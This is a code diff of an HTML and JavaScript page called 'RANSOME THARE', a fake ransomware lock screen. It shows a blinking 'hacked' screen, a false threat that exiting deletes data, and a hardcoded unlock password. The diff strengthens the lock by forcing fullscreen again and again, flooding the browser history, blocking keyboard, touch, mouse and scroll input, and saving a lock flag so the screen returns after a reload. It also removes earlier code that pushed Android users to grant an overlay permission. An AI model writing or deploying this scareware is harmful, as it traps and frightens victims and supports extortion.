@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
     <title>RANSOME THARE</title>
     <style>
         * {
@@ -11,55 +11,23 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
         }
 
-        body {
-            background: #0a0a0a;
-            min-height: 100vh;
-            overflow: hidden;
-            position: fixed;
+        /* Block all possible interactions */
+        html, body {
             width: 100%;
             height: 100%;
-            font-family: 'Courier New', monospace;
-        }
-
-        /* LOADING SCREEN */
-        .loading-screen {
+            overflow: hidden;
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            right: 0;
+            bottom: 0;
             background: #0a0a0a;
-            z-index: 100000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
         }
 
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 3px solid #ff0000;
-            border-top: 3px solid transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            color: #ff0000;
-            font-size: 14px;
-        }
-
-        /* LOCK SCREEN - FULL JAM */
+        /* LOCK SCREEN - FULL IMMERSIVE */
         .lock-screen {
             position: fixed;
             top: 0;
@@ -67,18 +35,19 @@
             width: 100%;
             height: 100%;
             background: linear-gradient(135deg, #0a0a0a, #1a0000);
-            z-index: 99999;
-            display: none;
+            z-index: 999999;
+            display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
             padding: 20px;
+            pointer-events: auto;
         }
 
         .skull {
             font-size: 100px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             filter: drop-shadow(0 0 20px red);
             animation: shake 0.5s infinite;
         }
@@ -90,11 +59,11 @@
         }
 
         .hacked-title {
-            font-size: 42px;
+            font-size: 38px;
             font-weight: bold;
             color: #ff0000;
             letter-spacing: 5px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             text-shadow: 0 0 10px red;
             animation: blink 1s infinite;
         }
@@ -105,22 +74,22 @@
         }
 
         .sub-text {
-            font-size: 16px;
+            font-size: 14px;
             color: #ff6666;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         .message-box {
             background: rgba(0,0,0,0.7);
             border: 2px solid #ff0000;
             border-radius: 20px;
-            padding: 25px;
-            width: 85%;
-            margin-bottom: 30px;
+            padding: 20px;
+            width: 90%;
+            margin-bottom: 25px;
         }
 
         .warning-text {
-            font-size: 14px;
+            font-size: 13px;
             color: #ff8888;
             line-height: 1.5;
         }
@@ -142,6 +111,7 @@
             font-weight: bold;
             font-family: monospace;
             color: #ff6666;
+            letter-spacing: 2px;
         }
 
         .unlock-btn {
@@ -149,11 +119,11 @@
             color: white;
             border: none;
             border-radius: 50px;
-            padding: 18px 40px;
-            font-size: 22px;
+            padding: 16px 40px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
-            margin: 15px 0;
+            margin: 10px 0;
             box-shadow: 0 0 20px rgba(255,0,0,0.5);
         }
 
@@ -161,12 +131,19 @@
             transform: scale(0.97);
         }
 
+        .exit-warning {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #ff6666;
+            opacity: 0.6;
+        }
+
         .footer-text {
             position: absolute;
-            bottom: 20px;
-            font-size: 10px;
+            bottom: 15px;
+            font-size: 9px;
             color: #ff6666;
-            opacity: 0.5;
+            opacity: 0.4;
         }
 
         /* PASSWORD MODAL */
@@ -178,7 +155,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.98);
-            z-index: 200000;
+            z-index: 1000000;
             justify-content: center;
             align-items: center;
         }
@@ -207,7 +184,7 @@
             font-size: 20px;
             text-align: center;
             background: white;
-            letter-spacing: 3px;
+            letter-spacing: 5px;
         }
 
         .password-box button {
@@ -239,19 +216,18 @@
             padding: 15px 30px;
             border-radius: 50px;
             font-size: 18px;
-            z-index: 300000;
+            z-index: 2000000;
             display: none;
             white-space: nowrap;
+        }
+
+        /* Hide all possible overlays */
+        iframe, object, embed {
+            display: none !important;
         }
     </style>
 </head>
 <body>
-
-    <!-- LOADING SCREEN -->
-    <div id="loadingScreen" class="loading-screen">
-        <div class="loader"></div>
-        <div class="loading-text">🔐 Initializing security...</div>
-    </div>
 
     <!-- LOCK SCREEN -->
     <div id="lockScreen" class="lock-screen">
@@ -267,15 +243,14 @@
                 <span class="highlight">DO NOT CLOSE THIS SCREEN</span>
             </div>
             <div class="device-id-box">
-                <div class="device-id-value" id="deviceId">----</div>
+                <div class="device-id-value" id="deviceId">THARE-80892</div>
             </div>
         </div>
 
         <button class="unlock-btn" id="unlockBtn">🔓 UNLOCK DEVICES</button>
         
-        <div class="footer-text">
-            ⚠️ @Anonymousploit01 | RANSOME THARE
-        </div>
+        <div class="exit-warning">⚠️ Exiting will delete your data</div>
+        <div class="footer-text">@Anonymousploit01 | RANSOME THARE</div>
     </div>
 
     <!-- PASSWORD MODAL -->
@@ -294,150 +269,126 @@
     <script>
         const UNLOCK_PASSWORD = "123456";
         
-        // Generate Device ID
-        function generateDeviceId() {
-            return 'THARE-' + Math.floor(10000 + Math.random() * 90000).toString();
-        }
+        // Fixed Device ID
+        document.getElementById('deviceId').innerText = 'THARE-80892';
 
-        let deviceId = localStorage.getItem('ransome_device_id');
-        if (!deviceId) {
-            deviceId = generateDeviceId();
-            localStorage.setItem('ransome_device_id', deviceId);
-        }
-        document.getElementById('deviceId').innerText = deviceId;
-
-        // ========== CHECK OVERLAY PERMISSION (For Real Android) ==========
-        function checkOverlayPermission() {
-            // For Android WebView, we need to detect if permission is granted
-            // This will redirect to settings if not granted
-            return new Promise((resolve) => {
-                // Try to detect if we're in Android WebView
-                const userAgent = navigator.userAgent.toLowerCase();
-                const isAndroid = userAgent.indexOf('android') > -1;
-                
-                if (isAndroid) {
-                    // Check if permission might be needed
-                    // For first time, always redirect to settings
-                    if (!localStorage.getItem('overlay_permission_granted')) {
-                        // Redirect to Android overlay permission settings
-                        window.location.href = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
-                        setTimeout(() => {
-                            // After returning, assume permission granted
-                            localStorage.setItem('overlay_permission_granted', 'true');
-                            resolve(true);
-                        }, 100);
-                    } else {
-                        resolve(true);
-                    }
-                } else {
-                    // For browser demo, auto-grant
-                    localStorage.setItem('overlay_permission_granted', 'true');
-                    resolve(true);
-                }
-            });
-        }
-
-        // ========== FORCE REDIRECT TO PERMISSION SETTINGS ==========
-        function redirectToOverlaySettings() {
-            // Android intent to open overlay permission settings
-            const intentUrl = 'intent://settings#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
-            
-            // Try multiple methods
-            try {
-                // Method 1: Direct settings
-                window.location.href = 'package:' + window.location.packageName + '?opentype=overlay';
-            } catch(e) {}
-            
-            try {
-                // Method 2: Android settings
-                window.location.href = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
-            } catch(e) {}
-            
-            try {
-                // Method 3: Intent
-                window.location.href = intentUrl;
-            } catch(e) {}
-            
-            // Fallback: Show instruction
-            setTimeout(() => {
-                alert("⚠️ Please allow 'Display over other apps' permission for this app to work properly.\n\nGo to Settings → Apps → RANSOME THARE → Display over other apps → ALLOW");
-            }, 1000);
-        }
-
-        // ========== SHOW LOCK SCREEN ==========
-        function showLockScreen() {
-            document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('lockScreen').style.display = 'flex';
-            
-            // Force fullscreen
-            enterFullscreen();
-            
-            // Block all exits
-            blockAllExits();
-            
-            // Continuous history push
-            setInterval(() => {
-                window.history.pushState(null, '', window.location.href);
-            }, 300);
-        }
-
-        // ========== FULLSCREEN ==========
+        // ========== FULLSCREEN & HIDE EVERYTHING ==========
         function enterFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+            
+            // Also try to hide status bar
+            window.scrollTo(0, 1);
         }
 
+        // Force fullscreen always
         document.addEventListener('fullscreenchange', function() {
             if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-                setTimeout(() => enterFullscreen(), 100);
+                setTimeout(() => enterFullscreen(), 50);
+            }
+        });
+        
+        document.addEventListener('webkitfullscreenchange', function() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                setTimeout(() => enterFullscreen(), 50);
             }
         });
 
-        // ========== BLOCK ALL EXITS ==========
-        function blockAllExits() {
-            for(let i = 0; i < 50; i++) {
+        // ========== BLOCK EVERYTHING ==========
+        function blockEverything() {
+            // Block back button - push infinite history
+            for(let i = 0; i < 100; i++) {
                 window.history.pushState(null, '', window.location.href);
             }
             
             window.addEventListener('popstate', function(e) {
-                for(let i = 0; i < 50; i++) {
+                for(let i = 0; i < 100; i++) {
                     window.history.pushState(null, '', window.location.href);
                 }
-            });
-
-            window.addEventListener('beforeunload', function(e) {
-                e.preventDefault();
-                e.returnValue = '🔒 DEVICE LOCKED!';
-                return '🔒 DEVICE LOCKED!';
-            });
-
-            document.addEventListener('keydown', function(e) {
-                e.preventDefault();
                 return false;
             });
 
+            // Block tab close
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '🔒 DEVICE LOCKED! Enter password to unlock.';
+                return '🔒 DEVICE LOCKED! Enter password to unlock.';
+            });
+
+            // Block ALL keyboard keys
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            });
+
+            // Block ALL touch events
+            document.addEventListener('touchstart', function(e) {
+                e.preventDefault();
+            });
             document.addEventListener('touchmove', function(e) {
                 e.preventDefault();
             });
+            document.addEventListener('touchend', function(e) {
+                e.preventDefault();
+            });
 
+            // Block mouse events
+            document.addEventListener('mousedown', function(e) {
+                e.preventDefault();
+            });
+            document.addEventListener('mouseup', function(e) {
+                e.preventDefault();
+            });
+            document.addEventListener('click', function(e) {
+                if (e.target.id !== 'unlockBtn' && !e.target.classList.contains('unlock-btn')) {
+                    e.preventDefault();
+                }
+            });
+
+            // Block context menu (long press)
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 return false;
             });
+
+            // Block wheel/scroll
+            document.addEventListener('wheel', function(e) {
+                e.preventDefault();
+            }, { passive: false });
+
+            // Block gesture events
+            document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
+            document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
+            document.addEventListener('gestureend', function(e) { e.preventDefault(); });
         }
 
-        // ========== PASSWORD ==========
+        // ========== PASSWORD MODAL (Only working thing) ==========
         function showPasswordModal() {
             document.getElementById('passwordModal').style.display = 'flex';
             document.getElementById('unlockPassword').value = '';
             document.getElementById('passError').style.display = 'none';
+            
+            // Temporarily allow typing in password field
+            const passInput = document.getElementById('unlockPassword');
+            passInput.addEventListener('touchstart', function(e) {
+                e.stopPropagation();
+            });
+            passInput.addEventListener('keydown', function(e) {
+                e.stopPropagation();
+            });
+        }
+
+        function closePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
         }
 
         function verifyPassword() {
             const pass = document.getElementById('unlockPassword').value;
             if (pass === UNLOCK_PASSWORD) {
-                document.getElementById('passwordModal').style.display = 'none';
+                closePasswordModal();
                 const toast = document.getElementById('successToast');
                 toast.style.display = 'block';
                 setTimeout(() => {
@@ -456,24 +407,38 @@
             }, 500);
         }
 
+        // ========== SAVE STATE FOR RESTART ==========
+        function saveLockState() {
+            localStorage.setItem('ransome_locked', 'true');
+            localStorage.setItem('ransome_device_id', 'THARE-80892');
+        }
+
+        function checkLockState() {
+            const isLocked = localStorage.getItem('ransome_locked');
+            if (isLocked === 'true') {
+                // Still locked, show lock screen
+                document.getElementById('lockScreen').style.display = 'flex';
+                blockEverything();
+                enterFullscreen();
+            }
+        }
+
         // ========== INIT ==========
-        async function init() {
-            // Hide loading screen after 1 sec
-            setTimeout(async () => {
-                // Check if permission already granted
-                const permissionGranted = localStorage.getItem('overlay_permission_granted');
-                
-                if (!permissionGranted) {
-                    // First time - redirect to permission settings
-                    redirectToOverlaySettings();
-                    
-                    // Wait for return, then mark as granted
-                    setTimeout(() => {
-                        localStorage.setItem('overlay_permission_granted', 'true');
-                        showLockScreen();
-                    }, 3000);
-                } else {
-                    showLockScreen();
+        function init() {
+            saveLockState();
+            checkLockState();
+            enterFullscreen();
+            blockEverything();
+            
+            // Continuously push history
+            setInterval(() => {
+                window.history.pushState(null, '', window.location.href);
+            }, 200);
+            
+            // Re-apply fullscreen periodically
+            setInterval(() => {
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    enterFullscreen();
                 }
             }, 1000);
         }
